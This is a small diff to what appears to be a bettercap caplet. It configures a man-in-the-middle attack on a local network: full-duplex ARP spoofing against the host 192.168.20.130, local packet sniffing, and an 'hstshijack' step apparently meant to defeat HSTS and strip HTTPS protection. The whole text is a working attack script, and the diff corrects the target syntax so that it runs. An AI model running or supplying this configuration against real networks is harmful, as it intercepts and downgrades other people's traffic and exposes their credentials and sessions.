@@ -1,4 +1,9 @@
 net.probe on
-set arp.spoof fullduplex true 192.168.20.130
+set arp.spoof fullduplex true 
+set arp.spoof fullduplex targets 192.168.20.130
 arp.spoof on
+set net.sniff.local true
 net.sniff on
+
+caplets.show
+hstshijack
